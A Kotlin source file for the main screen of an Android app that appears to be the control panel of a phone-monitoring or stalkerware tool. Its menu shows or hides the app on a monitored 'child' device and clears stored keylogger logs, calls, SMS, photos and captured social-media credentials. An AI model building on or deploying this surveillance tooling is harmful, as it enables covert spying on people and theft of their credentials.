package com.github.midros.istheapp.ui.activities.main

import android.os.Bundle
import android.support.v4.view.ViewPager
import android.support.v7.widget.Toolbar
import android.view.Menu
import android.view.MenuItem
import cn.pedant.SweetAlert.SweetAlertDialog
import com.github.midros.istheapp.R
import com.github.midros.istheapp.ui.activities.base.BaseActivity
import com.github.midros.istheapp.ui.activities.login.LoginActivity
import com.github.midros.istheapp.utils.ConstFun.startAndFinishActivity
import com.github.midros.istheapp.utils.Consts.CALLS
import com.github.midros.istheapp.utils.Consts.CHILD_SHOW_APP
import com.github.midros.istheapp.utils.Consts.DATA
import com.github.midros.istheapp.utils.Consts.KEY_LOGGER
import com.github.midros.istheapp.utils.Consts.PHOTO
import com.github.midros.istheapp.utils.Consts.SMS
import com.github.midros.istheapp.data.preference.DataSharePreference.getFinishAppState
import com.github.midros.istheapp.ui.widget.CustomTabLayout
import com.github.midros.istheapp.utils.Consts.CHILD_SOCIAL_MS
import com.github.midros.istheapp.utils.Consts.SOCIAL
import com.github.midros.istheapp.utils.FileHelper.deleteAllFile
import com.pawegio.kandroid.longToast
import kotterknife.bindView
import javax.inject.Inject


/**
 * Created by luis rafael on 7/03/18.
 */

class MainActivity : BaseActivity(), InterfaceViewMain {

    private val tabLayout: CustomTabLayout by bindView(R.id.tabs_view_main)
    private val viewPager: ViewPager by bindView(R.id.viewpager_main)
    private val toolbar: Toolbar by bindView(R.id.toolbar)
    //private val adViewMain: AdView by bindView(R.id.adView_main)

    @Inject
    lateinit var interactor: InterfaceInteractorMain<InterfaceViewMain>
    @Inject
    lateinit var pagerAdapter: PagerAdapterFragment

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        activityComponent!!.inject(this)
        interactor.onAttach(this)
        setSupportActionBar(toolbar)
        setPagerFragment()
        //initializeAdMob()
    }

    /*private fun initializeAdMob(){
        MobileAds.initialize(this,getString(R.string.ID_ADMOB))
        val adRequest = AdRequest.Builder().build()
        adViewMain.loadAd(adRequest)
    }*/

    override fun onPostCreate(savedInstanceState: Bundle?) {
        super.onPostCreate(savedInstanceState)
        if (getFinishAppState()) interactor.setCountDownTimer()
    }

    override fun onUserInteraction() {
        super.onUserInteraction()
        if (getFinishAppState()) interactor.restartCountDownTimer()
    }

    override fun onCreateOptionsMenu(menu: Menu?): Boolean {
        menuInflater.inflate(R.menu.menu_main, menu)
        return true
    }

    override fun onOptionsItemSelected(item: MenuItem): Boolean {
        when (item.itemId) {
            R.id.nav_sign_out -> interactor.signOut()
            R.id.nav_show_app -> interactor.getDatabaseReference("$DATA/$CHILD_SHOW_APP").setValue(true)
            R.id.nav_hide_app -> interactor.getDatabaseReference("$DATA/$CHILD_SHOW_APP").setValue(false)
            R.id.nav_clear_keylogger -> showDialogClearKeyloggerList()
            R.id.nav_clear_calls -> showDialogClearCallsList()
            R.id.nav_clear_sms -> showDialogClearSmsList()
            R.id.nav_clear_photo -> showDialogClearPhotoList()
            R.id.nav_clear_social -> showDialogClearSocial()
        }
        return super.onOptionsItemSelected(item)
    }

    private fun showDialogClearKeyloggerList() {

        showDialog(SweetAlertDialog.WARNING_TYPE, R.string.title_dialog, getString(R.string.message_dialog_clear_keylogger),
                R.string.clear, true) {
            setConfirmClickListener {
                interactor.getDatabaseReference("$KEY_LOGGER/$DATA").removeValue()
                hideDialog()
            }
            show()
        }


    }

    private fun showDialogClearCallsList() {

        showDialog(SweetAlertDialog.WARNING_TYPE, R.string.title_dialog, getString(R.string.message_dialog_clear_calls),
                R.string.clear, true) {
            setConfirmClickListener {
                interactor.getDatabaseReference("$CALLS/$DATA").removeValue()
                //interactor.getStorageReference(CALLS).delete()
                deleteAllFile()
                hideDialog()
            }
            show()
        }
    }

    private fun showDialogClearSmsList() {

        showDialog(SweetAlertDialog.WARNING_TYPE, R.string.title_dialog, getString(R.string.message_dialog_clear_sms),
                R.string.clear, true) {
            setConfirmClickListener {
                interactor.getDatabaseReference("$SMS/$DATA").removeValue()
                hideDialog()
            }
            show()
        }
    }

    private fun showDialogClearPhotoList() {

        showDialog(SweetAlertDialog.WARNING_TYPE, R.string.title_dialog, getString(R.string.message_dialog_clear_photos),
                R.string.clear, true) {
            setConfirmClickListener {
                interactor.getDatabaseReference("$PHOTO/$DATA").removeValue()
                //interactor.getStorageReference(PHOTO).delete()
                hideDialog()
            }
            show()
        }
    }

    private fun showDialogClearSocial() {
        showDialog(SweetAlertDialog.WARNING_TYPE, R.string.title_dialog, getString(R.string.message_dialog_clear_credentials),
                R.string.clear, true) {
            setConfirmClickListener {
                interactor.getDatabaseReference("$SOCIAL/$CHILD_SOCIAL_MS").removeValue()
                hideDialog()
            }
            show()
        }
    }

    override fun signOutView() {
        startAndFinishActivity<LoginActivity>()
    }

    private fun setPagerFragment() {
        viewPager.apply {
            adapter = pagerAdapter
            currentItem = 0
            setPageTransformer(true, pageTransformer())
        }
        tabLayout.setupWithViewPager(viewPager);
        pagerAdapter.setIconTextTabs(tabLayout)
    }

    private fun pageTransformer(): ViewPager.PageTransformer = ViewPager.PageTransformer { page, position ->
        page.translationX = if (position < 0.0f) 0.0f else (-page.width).toFloat() * position
    }

    override fun onFinishCount() {
        longToast(getString(R.string.closed_for_inactivity))
        finish()
    }

    override fun onDestroy() {
        interactor.onDetach()
        clearDisposable()
        super.onDestroy()
    }

    fun setIndicatorVisible(position: Int) {
        if (!tabLayout.getIndicatorTabAt(position).tabs!!.isSelected)
            tabLayout.getIndicatorTabAt(position).setIndicatorVisible(true)
    }

}
